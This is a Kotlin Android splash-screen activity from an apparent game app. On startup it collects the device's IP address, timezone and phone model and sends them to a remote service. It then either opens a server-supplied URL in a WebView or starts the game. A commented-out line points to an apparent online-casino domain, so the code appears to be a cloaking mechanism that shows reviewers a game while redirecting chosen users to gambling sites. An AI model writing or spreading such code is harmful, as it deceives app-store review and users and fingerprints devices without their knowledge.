package com.example.prime.testapplication.activity

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.os.Bundle
import com.example.prime.testapplication.game.MainActivity
import com.example.prime.testapplication.network.IPModel
import com.example.prime.testapplication.network.IPService
import com.example.prime.testapplication.network.URLModel
import com.example.prime.testapplication.network.URLService
import com.github.salomonbrys.kodein.LazyKodein
import com.github.salomonbrys.kodein.android.KodeinAppCompatActivity
import com.github.salomonbrys.kodein.android.appKodein
import com.github.salomonbrys.kodein.instance
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import java.util.*


class SplashActivity : KodeinAppCompatActivity() {

    protected val kodein = LazyKodein(appKodein)
    protected val ipService = kodein.instance<IPService>()
    protected val urlService = kodein.instance<URLService>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val myDevide = checkPhoneModel()

        val timeZone = TimeZone.getDefault().getDisplayName(false, TimeZone.SHORT)
        val text = timeZone.replace("0", "")
        val text2 = text.replace("+", "")
        val text3 = text2.replace(":", "")

        val myTimeValue = text3.substring(3).trim()
        var myIp = ""

//        val intent = Intent(this@SplashActivity, WebviewActivity::class.java)
//        intent.putExtra("url", "http://kasino-vulkan.fun")
//        startActivity(intent)

        if (isNetworkAvailable){

            ipService.value.getIpAddress()
                    .subscribeOn(Schedulers.newThread())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe({ t: IPModel ->

                        if (t.query != null){ myIp = t.query!! }
                        if (t.ip != null){ myIp = t.ip!! }

                        val body =  HashMap<String, Any>()
                        body["ip"] = myIp
                        body["z"] = myTimeValue.toInt()
                        body["model"] = myDevide

                        urlService.value.checkUrl(body)
                                .subscribeOn(Schedulers.newThread())
                                .observeOn(AndroidSchedulers.mainThread())
                                .subscribe({ t: URLModel ->

                                    if (t.url != null){
                                        val intent = Intent(this@SplashActivity, WebviewActivity::class.java)
                                        intent.putExtra("url", t.url)
                                        startActivity(intent)
                                    } else {
                                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                                    }

                                }, { e ->
                                    e.printStackTrace()
                                    startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                                })

                    }, { e ->
                        e.printStackTrace()
                        startActivity(Intent(this@SplashActivity, MainActivity::class.java))
                    })

        } else {
            startActivity(Intent(this@SplashActivity, MainActivity::class.java))
        }

    }

    private val isNetworkAvailable: Boolean
        get() {
            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val activeNetworkInfo = connectivityManager.activeNetworkInfo
            return activeNetworkInfo != null && activeNetworkInfo.isConnected
        }

    private fun checkPhoneModel(): String{
        return android.os.Build.MANUFACTURER + " " + android.os.Build.MODEL
    }

}
